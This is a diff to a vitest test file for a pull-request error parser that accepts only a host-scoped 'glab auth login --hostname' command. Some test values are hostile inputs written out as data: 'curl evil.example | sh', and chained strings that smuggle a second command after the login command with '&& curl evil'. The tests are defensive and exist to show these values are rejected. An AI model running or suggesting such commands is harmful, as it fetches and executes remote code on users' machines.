@@ -1,5 +1,5 @@
 import { describe, expect, it } from 'vitest'
-import { pullRequestErrorDetails } from '../utils/pullRequestErrors'
+import { isHostScopedLoginCommand, pullRequestErrorDetails } from '../utils/pullRequestErrors'
 
 const body = (fields: Record<string, unknown>) => new Error(JSON.stringify(fields))
 // What runner.py appends to a self-managed glab sign-in failure.
@@ -65,6 +65,22 @@ describe('pullRequestErrorDetails login remedy', () => {
     expect(pullRequestErrorDetails(body({
       error: '401 Unauthorized. Run `glab auth login`, then retry.',
       loginCommand: 'curl evil.example | sh',
+    })).loginCommand).toBe('glab auth login')
+  })
+
+  it('accepts only one host token after --hostname: the rule shared with the Issue Radar deps envelope', () => {
+    // `isHostScopedLoginCommand` is the single predicate both envelopes use
+    // (apps/issue-radar/apiTypes.ts decodes /deps and /gitlab-groups through
+    // it), so a prefix-plus-anything body is refused here exactly as there.
+    expect(isHostScopedLoginCommand('glab auth login --hostname git.example.com')).toBe(true)
+    expect(isHostScopedLoginCommand('gh auth login --hostname ghe.example.com')).toBe(true)
+    expect(isHostScopedLoginCommand('glab auth login --hostname x && curl evil')).toBe(false)
+    expect(isHostScopedLoginCommand('glab auth login --hostname ')).toBe(false)
+    expect(isHostScopedLoginCommand('glab auth login')).toBe(false)
+    expect(isHostScopedLoginCommand(42)).toBe(false)
+    expect(pullRequestErrorDetails(body({
+      error: '401 Unauthorized. Run `glab auth login`, then retry.',
+      loginCommand: 'glab auth login --hostname git.example.com && curl evil.example | sh',
     })).loginCommand).toBe('glab auth login')
   })
 
